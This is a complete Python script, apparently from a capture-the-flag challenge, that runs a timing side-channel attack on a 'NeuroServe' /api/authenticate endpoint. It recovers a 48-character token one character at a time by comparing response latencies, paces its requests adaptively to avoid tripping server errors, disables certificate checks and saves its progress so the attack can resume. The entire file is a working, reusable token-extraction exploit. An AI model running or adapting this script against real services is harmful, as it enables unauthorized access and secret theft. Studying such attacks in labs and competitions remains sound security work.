#!/usr/bin/env python3
"""Adaptive low-rate timing attack against NeuroServe /api/authenticate.

- Keeps a persistent progress file (state.json) so runs can resume.
- Never scores 502 responses: backs off and retries.
- Screens each position with 1 sample over the full charset,
  then verifies leaders with extra samples.
"""
import json
import statistics
import string
import sys
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "https://bbfbc1bf-5042-411e-86b4-29657887ee45.222.255.138.122.nip.io"
URL = BASE + "/api/authenticate"
STATE_FILE = "/home/light/Workspace/CTF/CTF_Da_Nang_2026/Misc/Misc_Challenge_4/script/state.json"

TOKEN_LENGTH = 48
CHARSET = string.digits + string.ascii_lowercase + string.ascii_uppercase

START_DELAY = 2.5   # initial spacing seconds
MIN_DELAY = 1.2     # floor once stable
MAX_DELAY = 30.0


def load_state():
    try:
        with open(STATE_FILE) as f:
            return json.load(f)
    except Exception:
        return {"recovered": ""}


def save_state(state):
    with open(STATE_FILE, "w") as f:
        json.dump(state, f)


class Client:
    def __init__(self):
        self.s = requests.Session()
        self.s.verify = False
        self.delay = START_DELAY
        self.last = 0.0
        self.stable = 0

    def post(self, token):
        """Return (ms, resp) with 502/network errors retried transparently."""
        while True:
            wait = self.delay - (time.monotonic() - self.last)
            if wait > 0:
                time.sleep(wait)
            t0 = time.perf_counter()
            try:
                r = self.s.post(URL, json={"token": token}, timeout=25)
            except requests.RequestException as e:
                self.last = time.monotonic()
                self.stable = 0
                self.delay = min(MAX_DELAY, max(self.delay * 1.8, 4.0))
                print(f"    [neterr {type(e).__name__}] backoff -> {self.delay:.2f}s", flush=True)
                continue
            ms = (time.perf_counter() - t0) * 1000
            self.last = time.monotonic()
            if r.status_code == 502:
                self.stable = 0
                self.delay = min(MAX_DELAY, max(self.delay * 1.8, 4.0))
                print(f"    [502] backoff -> {self.delay:.2f}s", flush=True)
                continue
            if r.status_code >= 500:
                self.stable = 0
                self.delay = min(MAX_DELAY, max(self.delay * 1.8, 4.0))
                print(f"    [{r.status_code}] backoff -> {self.delay:.2f}s", flush=True)
                continue
            self.stable += 1
            if self.stable >= 4 and self.delay > MIN_DELAY:
                self.delay = max(MIN_DELAY, self.delay * 0.9)
                self.stable = 0
            return ms, r


def probe(c, prefix, ch, pad="0"):
    token = prefix + ch + pad * (TOKEN_LENGTH - len(prefix) - 1)
    ms, r = c.post(token)
    if r.status_code == 200:
        print(f"\n*** SUCCESS *** token={token}\n{r.text}", flush=True)
        sys.exit(0)
    return ms


def solve_position(c, prefix, samples_verify=3):
    print(f"\n=== position {len(prefix)+1}/{TOKEN_LENGTH} prefix={prefix!r} ===", flush=True)
    screen = []
    for i, ch in enumerate(CHARSET):
        ms = probe(c, prefix, ch)
        screen.append((ms, ch))
        print(f"  [{i+1:2d}/62] {ch}: {ms:.2f} ms (cadence {c.delay:.2f}s)", flush=True)

    ranked = sorted(screen, reverse=True)
    top = [ch for _, ch in ranked[:4]]
    print("  leaders:", [(ch, round(ms, 2)) for ms, ch in ranked[:4]], flush=True)

    verified = []
    for ch in top:
        times = [probe(c, prefix, ch) for _ in range(samples_verify)]
        verified.append((statistics.median(times), ch))
        print(f"  verify {ch}: med={statistics.median(times):.2f} {[round(t,1) for t in times]}", flush=True)

    best_ms, best_ch = max(verified)
    margin = best_ms - sorted(v[0] for v in verified)[-2]
    print(f"  => picked {best_ch!r} ({best_ms:.2f} ms, margin {margin:.2f})", flush=True)
    return best_ch, best_ms, margin


def main():
    state = load_state()
    recovered = state["recovered"]
    c = Client()
    print(f"target={URL}\nrecovered so far: {recovered!r}", flush=True)

    while len(recovered) < TOKEN_LENGTH:
        ch, ms, margin = solve_position(c, recovered)
        recovered += ch
        state["recovered"] = recovered
        save_state(state)
        print(f"STATE: {recovered!r}", flush=True)

    # final auth attempt
    ms, r = c.post(recovered)
    print(f"FINAL {r.status_code}: {r.text}", flush=True)
    if r.status_code == 200:
        print("TOKEN:", recovered)


if __name__ == "__main__":
    main()
